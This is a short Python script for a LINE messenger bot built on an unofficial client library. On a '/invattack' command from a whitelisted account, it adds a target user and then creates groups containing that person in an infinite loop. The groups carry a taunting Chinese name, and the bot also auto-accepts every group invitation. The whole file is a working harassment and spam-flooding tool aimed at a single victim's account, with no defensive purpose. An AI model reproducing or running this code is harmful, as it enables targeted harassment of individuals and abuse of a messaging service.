from Linephu.linepy import *
from Linephu.akad.ttypes import *

client = LINE()

oepoll = OEPoll(client)

whitelist = ["u52afe1d4ea5332242efacfeb9190d2a3"]

def NOTIFIED_INVITE_INTO_GROUP(op):
    try:
        client.acceptGroupInvitation(op.param1)
    except Exception as e:
        print(e)
        print("\n\nNOTIFIED_INVITE_INTO_GROUP\n\n")
        return

def RECEIVE_MESSAGE(op):
    msg = op.message
    try:
        if msg.toType == 2:
            if msg._from in whitelist:
                if msg.text.startswith("/invattack"):
                    str1 = find_between_r(msg.text, "/invattack ", "")
                    targets = []
                    targets.append(str1)
                    client.findAndAddContactsByMid(str1)
                    groupname = "嫌人家群多? 好 我送你更多"
                    n = 0
                    client.sendMessage(msg.to, "啟動")
                    while True:
                        client.createGroup(groupname, [targets])
                        n += 1
                        print(n)
            else:
                pass
        else:
            pass
    except Exception as error:
        print(error)
        print("\n\nRECEIVE_MESSAGE\n\n")
        return


oepoll.addOpInterruptWithDict({
    OpType.RECEIVE_MESSAGE: RECEIVE_MESSAGE,
    OpType.NOTIFIED_INVITE_INTO_GROUP: NOTIFIED_INVITE_INTO_GROUP
})

def find_between_r(s, first, last):
    try:
        start = s.rindex(first) + len(first)
        end = s.rindex(last, start)
        return s[start:end]
    except ValueError:
        return ""


while True:
    oepoll.trace()
